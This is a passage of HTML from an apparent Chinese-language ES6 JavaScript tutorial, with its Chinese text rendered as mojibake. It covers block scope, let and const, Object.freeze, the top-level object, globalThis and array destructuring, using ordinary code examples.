href="#ä¸ºä»€ä¹ˆéœ€è¦å—çº§ä½œç”¨åŸŸï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆéœ€è¦å—çº§ä½œç”¨åŸŸï¼Ÿ"></a>ä¸ºä»€ä¹ˆéœ€è¦å—çº§ä½œç”¨åŸŸï¼Ÿ</h3><ul><li><p>å†…å±‚å˜é‡å¯èƒ½ä¼šè¦†ç›–å¤–å±‚å˜é‡ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> tmp = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(tmp);</span><br><span class="line">  <span class="keyword">if</span> (<span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> tmp = <span class="string">&#x27;hello world&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f(); <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure><p>å‡½æ•°<code>f</code>æ‰§è¡Œåï¼Œè¾“å‡ºç»“æœä¸º<code>undefined</code>ï¼ŒåŸå› åœ¨äºå˜é‡æå‡ï¼Œå¯¼è‡´å†…å±‚çš„<code>tmp</code>å˜é‡è¦†ç›–äº†å¤–å±‚çš„<code>tmp</code>å˜é‡ã€‚</p></li><li><p>ç”¨æ¥è®¡æ•°çš„å¾ªç¯å˜é‡æ³„éœ²ä¸ºå…¨å±€å˜é‡ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; s.length; i++) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(s[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(i); <span class="comment">// 5</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä¸­ï¼Œå˜é‡<code>i</code>åªç”¨æ¥æ§åˆ¶å¾ªç¯ï¼Œä½†æ˜¯å¾ªç¯ç»“æŸåï¼Œå®ƒå¹¶æ²¡æœ‰æ¶ˆå¤±ï¼Œè€Œæ˜¯æ³„éœ²æˆäº†å…¨å±€å˜é‡ã€‚</p></li></ul><h3 id="ES6-çš„å—çº§ä½œç”¨åŸŸ"><a href="#ES6-çš„å—çº§ä½œç”¨åŸŸ" class="headerlink" title="ES6 çš„å—çº§ä½œç”¨åŸŸ"></a>ES6 çš„å—çº§ä½œç”¨åŸŸ</h3><p>ES6 å…è®¸å—çº§ä½œç”¨åŸŸçš„ä»»æ„åµŒå¥—ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#123;&#123;</span><br><span class="line">  &#123;<span class="keyword">let</span> insane = <span class="string">&#x27;Hello World&#x27;</span>&#125;</span><br><span class="line">  <span class="built_in">console</span>.log(insane); <span class="comment">// æŠ¥é”™</span></span><br><span class="line">&#125;&#125;&#125;&#125;;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä½¿ç”¨äº†ä¸€ä¸ªäº”å±‚çš„å—çº§ä½œç”¨åŸŸï¼Œæ¯ä¸€å±‚éƒ½æ˜¯ä¸€ä¸ªå•ç‹¬çš„ä½œç”¨åŸŸã€‚ç¬¬å››å±‚ä½œç”¨åŸŸæ— æ³•è¯»å–ç¬¬äº”å±‚ä½œç”¨åŸŸçš„å†…éƒ¨å˜é‡ã€‚</p><p>å—çº§ä½œç”¨åŸŸçš„å‡ºç°ï¼Œå®é™…ä¸Šä½¿å¾—ç«‹å³æ‰§è¡Œå‡½æ•°è¡¨è¾¾å¼ï¼ˆåŒ¿å IIFEï¼‰ä¸å†å¿…è¦äº†ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// IIFE å†™æ³•</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> tmp = ...;</span><br><span class="line">&#125;());</span><br><span class="line"></span><br><span class="line"><span class="comment">// å—çº§ä½œç”¨åŸŸå†™æ³•</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">let</span> tmp = ...;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å—çº§ä½œç”¨åŸŸä¸å‡½æ•°å£°æ˜"><a href="#å—çº§ä½œç”¨åŸŸä¸å‡½æ•°å£°æ˜" class="headerlink" title="å—çº§ä½œç”¨åŸŸä¸å‡½æ•°å£°æ˜"></a>å—çº§ä½œç”¨åŸŸä¸å‡½æ•°å£°æ˜</h3><p>ES5 è§„å®šï¼Œå‡½æ•°åªèƒ½åœ¨é¡¶å±‚ä½œç”¨åŸŸå’Œå‡½æ•°ä½œç”¨åŸŸä¹‹ä¸­å£°æ˜ï¼Œä¸èƒ½åœ¨å—çº§ä½œç”¨åŸŸå£°æ˜ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æƒ…å†µä¸€</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æƒ…å†µäºŒ</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä¸¤ç§å‡½æ•°å£°æ˜ï¼Œæ ¹æ® ES5 çš„è§„å®šéƒ½æ˜¯éæ³•çš„ã€‚ä½†æ˜¯æµè§ˆå™¨ä¸ºå…¼å®¹ä»¥å‰çš„æ—§ä»£ç ï¼Œè¿˜æ˜¯æ”¯æŒåœ¨å—çº§ä½œç”¨åŸŸä¹‹ä¸­å£°æ˜å‡½æ•°ï¼Œå› æ­¤ä¸Šé¢ä¸¤ç§æƒ…å†µå®é™…éƒ½èƒ½è¿è¡Œï¼Œä¸ä¼šæŠ¥é”™ã€‚</p><p>ES6 å¼•å…¥äº†å—çº§ä½œç”¨åŸŸï¼Œæ˜ç¡®å…è®¸åœ¨å—çº§ä½œç”¨åŸŸä¹‹ä¸­å£°æ˜å‡½æ•°ã€‚ES6 è§„å®šï¼Œå—çº§ä½œç”¨åŸŸä¹‹ä¸­ï¼Œ<strong>å‡½æ•°å£°æ˜è¯­å¥çš„è¡Œä¸ºç±»ä¼¼äº<code>let</code>ï¼Œåœ¨å—çº§ä½œç”¨åŸŸä¹‹å¤–ä¸å¯å¼•ç”¨ã€‚</strong></p><p>ä½†æ˜¯ï¼Œå¦‚æœæ”¹å˜äº†å—çº§ä½œç”¨åŸŸå†…å£°æ˜çš„å‡½æ•°çš„å¤„ç†è§„åˆ™ï¼Œæ˜¾ç„¶ä¼šå¯¹è€ä»£ç äº§ç”Ÿå¾ˆå¤§å½±å“ã€‚ä¸ºäº†å‡è½»å› æ­¤äº§ç”Ÿçš„ä¸å…¼å®¹é—®é¢˜ï¼ŒES6 è§„å®šï¼Œæµè§ˆå™¨çš„å®ç°å¯ä»¥æœ‰è‡ªå·±çš„è¡Œä¸ºæ–¹å¼ï¼š</p><ul><li>å…è®¸åœ¨å—çº§ä½œç”¨åŸŸå†…å£°æ˜å‡½æ•°ã€‚</li><li>å‡½æ•°å£°æ˜ç±»ä¼¼äº<code>var</code>ï¼Œå³ä¼šæå‡åˆ°å…¨å±€ä½œç”¨åŸŸæˆ–å‡½æ•°ä½œç”¨åŸŸçš„å¤´éƒ¨ã€‚</li><li>åŒæ—¶ï¼Œå‡½æ•°å£°æ˜è¿˜ä¼šæå‡åˆ°æ‰€åœ¨çš„å—çº§ä½œç”¨åŸŸçš„å¤´éƒ¨ã€‚</li></ul><p>æ³¨æ„ï¼Œä¸Šé¢ä¸‰æ¡è§„åˆ™åªå¯¹ ES6 çš„æµè§ˆå™¨å®ç°æœ‰æ•ˆï¼Œå…¶ä»–ç¯å¢ƒçš„å®ç°ä¸ç”¨éµå®ˆï¼Œè¿˜æ˜¯å°†å—çº§ä½œç”¨åŸŸçš„å‡½æ•°å£°æ˜å½“ä½œ<code>let</code>å¤„ç†ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æµè§ˆå™¨çš„ ES6 ç¯å¢ƒ</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123; <span class="built_in">console</span>.log(<span class="string">&#x27;I am outside!&#x27;</span>); &#125;</span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="comment">// é‡å¤å£°æ˜ä¸€æ¬¡å‡½æ•°f</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123; <span class="built_in">console</span>.log(<span class="string">&#x27;I am inside!&#x27;</span>); &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  f();</span><br><span class="line">&#125;());</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®é™…è¿è¡Œçš„ä»£ç å¦‚ä¸‹ï¼š</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123; <span class="built_in">console</span>.log(<span class="string">&#x27;I am outside!&#x27;</span>); &#125;</span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> f = <span class="literal">undefined</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123; <span class="built_in">console</span>.log(<span class="string">&#x27;I am inside!&#x27;</span>); &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  f();</span><br><span class="line">&#125;());</span><br><span class="line"><span class="comment">// Uncaught TypeError: f is not a function</span></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥åº”è¯¥<strong>é¿å…åœ¨å—çº§ä½œç”¨åŸŸå†…å£°æ˜å‡½æ•°</strong>ã€‚å¦‚æœç¡®å®éœ€è¦ï¼Œä¹Ÿåº”è¯¥å†™æˆå‡½æ•°è¡¨è¾¾å¼ï¼ˆ<code>let f = function()&#123;...&#125;</code>ï¼‰ï¼Œè€Œä¸æ˜¯å‡½æ•°å£°æ˜è¯­å¥ã€‚</p><p>æ­¤å¤–ï¼ŒES6 çš„å—çº§ä½œç”¨åŸŸå¿…é¡»æœ‰å¤§æ‹¬å·ï¼Œå¦‚æœæ²¡æœ‰å¤§æ‹¬å·ï¼ŒJavaScript å¼•æ“å°±è®¤ä¸ºä¸å­˜åœ¨å—çº§ä½œç”¨åŸŸã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ç¬¬ä¸€ç§å†™æ³•ï¼ŒæŠ¥é”™</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) <span class="keyword">let</span> x = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç¬¬äºŒç§å†™æ³•ï¼Œä¸æŠ¥é”™</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> x = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3ã€constå‘½ä»¤"><a href="#3ã€constå‘½ä»¤" class="headerlink" title="3ã€constå‘½ä»¤"></a>3ã€constå‘½ä»¤</h2><h3 id="åŸºæœ¬ç”¨æ³•-1"><a href="#åŸºæœ¬ç”¨æ³•-1" class="headerlink" title="åŸºæœ¬ç”¨æ³•"></a>åŸºæœ¬ç”¨æ³•</h3><p><code>const</code>å£°æ˜ä¸€ä¸ªåªè¯»çš„å¸¸é‡ã€‚ä¸€æ—¦å£°æ˜ï¼Œå¸¸é‡çš„å€¼å°±ä¸èƒ½æ”¹å˜ã€‚ï¼ˆå³<code>const</code>ä¸€æ—¦å£°æ˜å˜é‡ï¼Œå°±å¿…é¡»ç«‹å³åˆå§‹åŒ–ï¼Œä¸èƒ½ç•™åˆ°ä»¥åèµ‹å€¼ã€‚ï¼‰åªå£°æ˜ä¸èµ‹å€¼ï¼Œå°±ä¼šæŠ¥é”™ï¼</p><p><code>const</code>çš„ä½œç”¨åŸŸä¸<code>let</code>å‘½ä»¤ç›¸åŒï¼šåªåœ¨å£°æ˜æ‰€åœ¨çš„å—çº§ä½œç”¨åŸŸå†…æœ‰æ•ˆï¼Œä¸”å£°æ˜çš„å¸¸é‡ä¹Ÿæ˜¯ä¸æå‡ï¼Œå­˜åœ¨æš‚æ—¶æ€§æ­»åŒºï¼Œåªèƒ½åœ¨å£°æ˜çš„ä½ç½®åé¢ä½¿ç”¨ã€‚</p><h3 id="æœ¬è´¨"><a href="#æœ¬è´¨" class="headerlink" title="æœ¬è´¨"></a>æœ¬è´¨</h3><p><code>const</code>å®é™…ä¸Šä¿è¯çš„ï¼Œå¹¶ä¸æ˜¯å˜é‡çš„å€¼ä¸å¾—æ”¹åŠ¨ï¼Œè€Œæ˜¯<strong>å˜é‡æŒ‡å‘çš„é‚£ä¸ªå†…å­˜åœ°å€æ‰€ä¿å­˜çš„æ•°æ®ä¸å¾—æ”¹åŠ¨</strong>ã€‚å¯¹äºç®€å•ç±»å‹çš„æ•°æ®ï¼ˆæ•°å€¼ã€å­—ç¬¦ä¸²ã€å¸ƒå°”å€¼ï¼‰ï¼Œå€¼å°±ä¿å­˜åœ¨å˜é‡æŒ‡å‘çš„é‚£ä¸ªå†…å­˜åœ°å€ï¼Œå› æ­¤ç­‰åŒäºå¸¸é‡ã€‚ä½†å¯¹äºå¤åˆç±»å‹çš„æ•°æ®ï¼ˆä¸»è¦æ˜¯å¯¹è±¡å’Œæ•°ç»„ï¼‰ï¼Œå˜é‡æŒ‡å‘çš„å†…å­˜åœ°å€ï¼Œä¿å­˜çš„åªæ˜¯ä¸€ä¸ªæŒ‡å‘å®é™…æ•°æ®çš„æŒ‡é’ˆï¼Œ<code>const</code>åªèƒ½ä¿è¯<strong>è¿™ä¸ªæŒ‡é’ˆæ˜¯å›ºå®šçš„</strong>ï¼Œè‡³äºå®ƒæŒ‡å‘çš„æ•°æ®ç»“æ„æ˜¯ä¸æ˜¯å¯å˜çš„ï¼Œå°±å®Œå…¨ä¸èƒ½æ§åˆ¶äº†ã€‚å› æ­¤ï¼Œå°†ä¸€ä¸ªå¯¹è±¡å£°æ˜ä¸ºå¸¸é‡å¿…é¡»éå¸¸å°å¿ƒã€‚</p><p>å¦‚æœçœŸçš„æƒ³å°†å¯¹è±¡å†»ç»“ï¼Œåº”è¯¥ä½¿ç”¨<code>Object.freeze</code>æ–¹æ³•ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> foo = <span class="built_in">Object</span>.freeze(&#123;&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¸¸è§„æ¨¡å¼æ—¶ï¼Œä¸‹é¢ä¸€è¡Œä¸èµ·ä½œç”¨ï¼›</span></span><br><span class="line"><span class="comment">// ä¸¥æ ¼æ¨¡å¼æ—¶ï¼Œè¯¥è¡Œä¼šæŠ¥é”™</span></span><br><span class="line">foo.prop = <span class="number">123</span>;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä¸­ï¼Œå¸¸é‡<code>foo</code>æŒ‡å‘ä¸€ä¸ªå†»ç»“çš„å¯¹è±¡ï¼Œæ‰€ä»¥æ·»åŠ æ–°å±æ€§ä¸èµ·ä½œç”¨ï¼Œä¸¥æ ¼æ¨¡å¼æ—¶è¿˜ä¼šæŠ¥é”™ã€‚</p><p>é™¤äº†å°†å¯¹è±¡æœ¬èº«å†»ç»“ï¼Œå¯¹è±¡çš„å±æ€§ä¹Ÿåº”è¯¥å†»ç»“ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªå°†å¯¹è±¡å½»åº•å†»ç»“çš„å‡½æ•°ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> constantize = <span class="function">(<span class="params">obj</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">Object</span>.freeze(obj);</span><br><span class="line">  <span class="built_in">Object</span>.keys(obj).forEach( <span class="function">(<span class="params">key, i</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">typeof</span> obj[key] === <span class="string">&#x27;object&#x27;</span> ) &#123;</span><br><span class="line">      constantize( obj[key] );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="ES6-å£°æ˜å˜é‡çš„å…­ç§æ–¹æ³•"><a href="#ES6-å£°æ˜å˜é‡çš„å…­ç§æ–¹æ³•" class="headerlink" title="ES6 å£°æ˜å˜é‡çš„å…­ç§æ–¹æ³•"></a>ES6 å£°æ˜å˜é‡çš„å…­ç§æ–¹æ³•</h3><p>ES5 åªæœ‰ä¸¤ç§å£°æ˜å˜é‡çš„æ–¹æ³•ï¼š<code>var</code>å‘½ä»¤å’Œ<code>function</code>å‘½ä»¤ã€‚ES6 é™¤äº†æ·»åŠ <code>let</code>å’Œ<code>const</code>å‘½ä»¤ï¼Œè¿˜æœ‰<code>import</code>å‘½ä»¤å’Œ<code>class</code>å‘½ä»¤ã€‚</p><h2 id="4ã€é¡¶å±‚å¯¹è±¡çš„å±æ€§"><a href="#4ã€é¡¶å±‚å¯¹è±¡çš„å±æ€§" class="headerlink" title="4ã€é¡¶å±‚å¯¹è±¡çš„å±æ€§"></a>4ã€é¡¶å±‚å¯¹è±¡çš„å±æ€§</h2><p>é¡¶å±‚å¯¹è±¡ï¼Œåœ¨æµè§ˆå™¨ç¯å¢ƒæŒ‡çš„æ˜¯<code>window</code>å¯¹è±¡ï¼Œåœ¨ Node æŒ‡çš„æ˜¯<code>global</code>å¯¹è±¡ã€‚</p><p>é¡¶å±‚å¯¹è±¡çš„å±æ€§ä¸å…¨å±€å˜é‡æŒ‚é’©å¸¦æ¥äº†å‡ ä¸ªå¾ˆå¤§çš„é—®é¢˜ï¼š</p><ul><li>é¦–å…ˆæ˜¯æ²¡æ³•åœ¨ç¼–è¯‘æ—¶å°±æŠ¥å‡ºå˜é‡æœªå£°æ˜çš„é”™è¯¯ï¼Œåªæœ‰è¿è¡Œæ—¶æ‰èƒ½çŸ¥é“ï¼ˆå› ä¸ºå…¨å±€å˜é‡å¯èƒ½æ˜¯é¡¶å±‚å¯¹è±¡çš„å±æ€§åˆ›é€ çš„ï¼Œè€Œå±æ€§çš„åˆ›é€ æ˜¯åŠ¨æ€çš„ï¼‰ï¼›</li><li>å…¶æ¬¡ï¼Œç¨‹åºå‘˜å¾ˆå®¹æ˜“ä¸çŸ¥ä¸è§‰åœ°å°±åˆ›å»ºäº†å…¨å±€å˜é‡ï¼ˆæ¯”å¦‚æ‰“å­—å‡ºé”™ï¼‰ï¼›</li><li>æœ€åï¼Œé¡¶å±‚å¯¹è±¡çš„å±æ€§æ˜¯åˆ°å¤„å¯ä»¥è¯»å†™çš„ï¼Œè¿™éå¸¸ä¸åˆ©äºæ¨¡å—åŒ–ç¼–ç¨‹ã€‚</li><li>å¦ä¸€æ–¹é¢ï¼Œ<code>window</code>å¯¹è±¡æœ‰å®ä½“å«ä¹‰ï¼ŒæŒ‡çš„æ˜¯æµè§ˆå™¨çš„çª—å£å¯¹è±¡ï¼Œé¡¶å±‚å¯¹è±¡æ˜¯ä¸€ä¸ªæœ‰å®ä½“å«ä¹‰çš„å¯¹è±¡ï¼Œä¹Ÿæ˜¯ä¸åˆé€‚çš„ã€‚</li></ul><p>ES6è§„å®šï¼šä¸ºäº†ä¿æŒå…¼å®¹æ€§ï¼Œ<code>var</code>å‘½ä»¤å’Œ<code>function</code>å‘½ä»¤å£°æ˜çš„å…¨å±€å˜é‡ï¼Œä¾æ—§æ˜¯é¡¶å±‚å¯¹è±¡çš„å±æ€§ï¼›<code>let</code>å‘½ä»¤ã€<code>const</code>å‘½ä»¤ã€<code>class</code>å‘½ä»¤å£°æ˜çš„å…¨å±€å˜é‡ï¼Œä¸å±äºé¡¶å±‚å¯¹è±¡çš„å±æ€§ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="comment">// å¦‚æœåœ¨ Node çš„ REPL ç¯å¢ƒï¼Œå¯ä»¥å†™æˆ global.a</span></span><br><span class="line"><span class="comment">// æˆ–è€…é‡‡ç”¨é€šç”¨æ–¹æ³•ï¼Œå†™æˆ this.a</span></span><br><span class="line"><span class="built_in">window</span>.a <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> b = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">window</span>.b <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure><h2 id="5ã€globalThis-å¯¹è±¡"><a href="#5ã€globalThis-å¯¹è±¡" class="headerlink" title="5ã€globalThis å¯¹è±¡"></a>5ã€globalThis å¯¹è±¡</h2><p>é¡¶å±‚å¯¹è±¡åœ¨å„ç§å®ç°é‡Œé¢æ˜¯ä¸ç»Ÿä¸€çš„ï¼š</p><ul><li>æµè§ˆå™¨é‡Œé¢ï¼Œé¡¶å±‚å¯¹è±¡æ˜¯<code>window</code>ï¼Œä½† Node å’Œ Web Worker æ²¡æœ‰<code>window</code>ã€‚</li><li>æµè§ˆå™¨å’Œ Web Worker é‡Œé¢ï¼Œ<code>self</code>ä¹ŸæŒ‡å‘é¡¶å±‚å¯¹è±¡ï¼Œä½†æ˜¯ Node æ²¡æœ‰<code>self</code>ã€‚</li><li>Node é‡Œé¢ï¼Œé¡¶å±‚å¯¹è±¡æ˜¯<code>global</code>ï¼Œä½†å…¶ä»–ç¯å¢ƒéƒ½ä¸æ”¯æŒã€‚</li></ul><p>ä¸ºäº†èƒ½å¤Ÿåœ¨å„ç§ç¯å¢ƒéƒ½èƒ½å–åˆ°é¡¶å±‚å¯¹è±¡ï¼Œç°åœ¨ä¸€èˆ¬æ˜¯ä½¿ç”¨<code>this</code>å…³é”®å­—ï¼Œä½†æ˜¯æœ‰å±€é™æ€§ã€‚</p><ul><li>å…¨å±€ç¯å¢ƒä¸­ï¼Œ<code>this</code>ä¼šè¿”å›é¡¶å±‚å¯¹è±¡ã€‚ä½†æ˜¯ï¼ŒNode.js æ¨¡å—ä¸­<code>this</code>è¿”å›çš„æ˜¯å½“å‰æ¨¡å—ï¼ŒES6 æ¨¡å—ä¸­<code>this</code>è¿”å›çš„æ˜¯<code>undefined</code>ã€‚</li><li>å‡½æ•°é‡Œé¢çš„<code>this</code>ï¼Œå¦‚æœå‡½æ•°ä¸æ˜¯ä½œä¸ºå¯¹è±¡çš„æ–¹æ³•è¿è¡Œï¼Œè€Œæ˜¯å•çº¯ä½œä¸ºå‡½æ•°è¿è¡Œï¼Œ<code>this</code>ä¼šæŒ‡å‘é¡¶å±‚å¯¹è±¡ã€‚ä½†æ˜¯ï¼Œä¸¥æ ¼æ¨¡å¼ä¸‹ï¼Œè¿™æ—¶<code>this</code>ä¼šè¿”å›<code>undefined</code>ã€‚</li><li>ä¸ç®¡æ˜¯ä¸¥æ ¼æ¨¡å¼ï¼Œè¿˜æ˜¯æ™®é€šæ¨¡å¼ï¼Œ<code>new Function(&#39;return this&#39;)()</code>ï¼Œæ€»æ˜¯ä¼šè¿”å›å…¨å±€å¯¹è±¡ã€‚ä½†æ˜¯ï¼Œå¦‚æœæµè§ˆå™¨ç”¨äº† CSPï¼ˆå†…å®¹å®‰å…¨ç­–ç•¥ï¼‰ï¼Œé‚£ä¹ˆ<code>eval</code>ã€<code>new Function</code>è¿™äº›æ–¹æ³•éƒ½å¯èƒ½æ— æ³•ä½¿ç”¨ã€‚</li></ul><h1 id="å˜é‡çš„è§£æ„èµ‹å€¼"><a href="#å˜é‡çš„è§£æ„èµ‹å€¼" class="headerlink" title="å˜é‡çš„è§£æ„èµ‹å€¼"></a>å˜é‡çš„è§£æ„èµ‹å€¼</h1><h2 id="1ã€æ•°ç»„çš„è§£æ„èµ‹å€¼"><a href="#1ã€æ•°ç»„çš„è§£æ„èµ‹å€¼" class="headerlink" title="1ã€æ•°ç»„çš„è§£æ„èµ‹å€¼"></a>1ã€æ•°ç»„çš„è§£æ„èµ‹å€¼</h2><h3 id="åŸºæœ¬ç”¨æ³•-2"><a href="#åŸºæœ¬ç”¨æ³•-2" class="headerlink" title="åŸºæœ¬ç”¨æ³•"></a>åŸºæœ¬ç”¨æ³•</h3><p>ES6 å…è®¸æŒ‰ç…§ä¸€å®šæ¨¡å¼ï¼Œä»<strong>æ•°ç»„å’Œå¯¹è±¡</strong>ä¸­æå–å€¼ï¼Œå¯¹å˜é‡è¿›è¡Œèµ‹å€¼ï¼Œè¿™è¢«ç§°ä¸ºè§£æ„ï¼ˆDestructuringï¼‰ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> [a, b, c] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br></pre></td></tr></table></figure><p>æœ¬è´¨ä¸Šï¼Œè¿™ç§å†™æ³•å±äº<strong>â€œæ¨¡å¼åŒ¹é…â€</strong>ï¼Œåªè¦ç­‰å·ä¸¤è¾¹çš„æ¨¡å¼ç›¸åŒï¼Œå·¦è¾¹çš„å˜é‡å°±ä¼šè¢«èµ‹äºˆå¯¹åº”çš„å€¼ã€‚å¦‚æœè§£æ„ä¸æˆåŠŸï¼Œå˜é‡çš„å€¼å°±ç­‰äº<code>undefined</code>ã€‚ä¸å®Œå…¨è§£æ„æƒ…å†µä¸‹ï¼Œè§£æ„ä¾ç„¶å¯ä»¥æˆåŠŸã€‚</p><p>å¦‚æœç­‰å·çš„å³è¾¹ä¸æ˜¯æ•°ç»„ï¼ˆæˆ–è€…ä¸¥æ ¼åœ°è¯´ï¼Œ<strong>ä¸æ˜¯å¯éå†çš„ç»“æ„</strong>ï¼Œå‚è§ã€ŠIteratorã€‹ä¸€ç« ï¼‰ï¼Œé‚£ä¹ˆå°†ä¼šæŠ¥é”™ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æŠ¥é”™</span></span><br><span class="line"><span class="keyword">let</span> [foo] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> [foo] = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">let</span> [foo] = <span class="literal">NaN</span>;</span><br><span class="line"><span class="keyword">let</span> [foo] = <span class="literal">undefined</span>;</span><br><span class="line"><span class="keyword">let</span> [foo] = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">let</span> [foo] = &#123;&#125;;</span><br></pre></td></tr></table></figure><p>åªè¦æŸç§æ•°æ®ç»“æ„å…·æœ‰ Iterator æ¥å£ï¼Œéƒ½å¯ä»¥é‡‡ç”¨æ•°ç»„å½¢å¼çš„è§£æ„èµ‹å€¼ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Setç»“æ„</span></span><br><span class="line"><span class="keyword">let</span> [x, y, z] = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line">x <span class="comment">// &quot;a&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//fibsæ˜¯ä¸€ä¸ª Generator å‡½æ•°ï¼ˆå‚è§ã€ŠGenerator å‡½æ•°ã€‹ä¸€ç« ï¼‰ï¼ŒåŸç”Ÿå…·æœ‰ Iterator æ¥å£ã€‚è§£æ„èµ‹å€¼ä¼šä¾æ¬¡ä»è¿™ä¸ªæ¥å£è·å–å€¼ã€‚</span></span><br><span class="line"><span class="function"><span class="keyword">function</span>* <span class="title">fibs</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> a = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> b = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">yield</span> a;</span><br><span class="line">    [a, b] = [b, a + b];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> [first, second, third, fourth, fifth, sixth] = fibs();</span><br><span class="line">sixth <span class="comment">// 5</span></span><br></pre></td></tr></table></figure><h3 id="é»˜è®¤å€¼"><a href="#é»˜è®¤å€¼" class="headerlink" title="é»˜è®¤å€¼"></a>é»˜è®¤å€¼</h3><p>è§£æ„èµ‹å€¼å…è®¸æŒ‡å®šé»˜è®¤å€¼ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> [foo = <span class="literal">true</span>] = [];</span><br><span class="line">foo <span class="comment">// true</span></span><br><span 